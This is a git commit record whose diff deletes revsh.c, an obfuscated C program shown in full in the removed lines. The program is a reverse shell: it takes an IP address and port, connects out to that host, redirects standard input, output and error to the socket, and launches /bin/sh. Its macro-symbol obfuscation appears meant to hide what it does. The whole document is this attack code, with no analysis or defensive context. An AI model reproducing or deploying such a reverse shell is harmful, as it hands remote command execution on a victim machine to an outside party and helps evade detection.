91a4ff1a514796140893ba5992c1fe927af19de2
1v4n <42386354+gaidardzhiev@users.noreply.github.com>
2024-09-13 11:26:23 +0300

    revsh.c

--- revsh.c
+++
@@ -1,7 +0,0 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <arpa/inet.h>
-#include "obf.h"
-π w(π c,÷*v[]){¶(c!=3){p(¢,"usage: %s <ip> <port>\n",v[0]);∆ 1;}π s;√ x £;÷*o=v[1];π q=m(v[2]);s=a(g,j,0);£.•=g;£.r=¥(q);°(g,o,&£.y);¶(k(s,(√ b*)&£,×(£))<0){f("failed");∆ 1;}d(s,0);d(s,1);d(s,2);e("/bin/sh",NULL,NULL);∆ 0;}
